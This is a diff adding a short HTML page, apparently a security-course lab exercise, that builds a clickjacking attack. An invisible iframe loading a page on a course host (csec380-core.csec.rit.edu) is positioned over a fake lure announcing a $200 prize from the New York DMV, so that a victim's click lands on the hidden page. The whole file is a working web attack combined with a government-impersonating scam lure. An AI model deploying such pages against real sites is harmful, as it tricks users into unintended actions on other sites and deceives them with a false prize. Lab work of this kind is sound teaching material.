@@ -1,0 +1,29 @@
+<!doctype html>
+
+<html>
+  <head>
+    <style>
+      iframe {
+          width: 1000px;
+          height: 1000px;
+          position: absolute;
+          opacity: 0;
+          top: -80px;
+          left: -850px;
+          z-index: 1;
+          overflow: hidden;
+      }
+    </style>
+  </head>
+
+
+  <body>
+    <h1>This is not a clickjacking attack!</h1>
+
+    <h2>Click it or Ticket!</h2>
+    <p>Thanks for driving safe. You've won $200 from the New York DMV. Just click below!</p>
+
+    <button>You Won!</button>
+    <iframe src="http://csec380-core.csec.rit.edu:84/home.php?id=47" />
+  </body>
+ </html>
